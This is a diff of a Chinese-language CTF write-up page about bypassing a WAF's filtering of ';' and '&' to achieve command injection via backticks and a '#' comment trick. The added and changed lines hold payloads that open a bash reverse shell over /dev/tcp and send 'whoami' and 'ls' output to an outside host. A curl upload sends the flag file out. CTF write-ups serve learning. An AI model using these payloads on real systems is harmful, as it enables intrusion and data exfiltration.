@@ -153,14 +153,18 @@
 
 <p>waf把<code>;</code> <code>&amp;</code>都过滤了，截断不能（瘫</p>
 <p>但其实截不截断的都无所谓啦，只要我们想执行的代码能跑就行，因此还是比较容易想到套娃式处理命令的反引号的。</p>
-<p>这里我以自己对重定向的理解试了试不用<code>&amp;</code>反弹shell，均以失败告终（悲</p>
+<p>这里我最开始以自己对重定向的理解试了试不用<code>&amp;</code>构造一个野鸡版反弹shell，均以失败告终（悲</p>
+<p>其中的迷惑操作包括但不限于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1#`bash%20-i%200&gt;/dev/tcp/233.33.3.333/2333%201&gt;/dev/tcp/233.33.3.333/2333`</span><br></pre></td></tr></table></figure>
+
+<p><del>（学习中 求轻喷）</del></p>
 <p>说实话一直对重定向的<code>&amp;</code>符似懂非懂 越往下挖越接近底层实现了 挖了个陨石坑属于是</p>
 <p>所以就改成分步执行命令了</p>
 <p>直接写命令的话会在<code>eval()</code>处报错而跳过<code>os.system()</code>，因此用<code>#</code>注释符注释掉要执行的命令，待绕过waf后它仍会正常跑的。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1#`whoami&gt;/dev/tcp/106.15.6.181/2333`</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1#`whoami&gt;/dev/tcp/233.33.3.333/2333`</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220413172345.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1#`ls&gt;/dev/tcp/106.15.6.181/2333`</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1#`ls&gt;/dev/tcp/233.33.3.333/2333`</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220413151334.png"></p>
 <p>把flag存进<code>./tmp/log.txt</code></p>
@@ -172,7 +176,7 @@
 <p>$ curl -F ‘file=@photo.png’ <a href="http://233.33.3.333">http://233.33.3.333</a></p>
 <p>上面命令会给 HTTP 请求加上标头Content-Type: multipart/form-data，然后将文件photo.png作为file字段上传。</p>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1#`curl-F%20flag=@tmp/log.txt%20http://233.33.3.333:2333`</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1#`curl%20-F%20flag=@tmp/log.txt%20http://233.33.3.333:2333`</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220413203858.png"></p>
 <h1 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h1><p>上传综合题，挺久没做了的说，生疏了好多（悲</p>
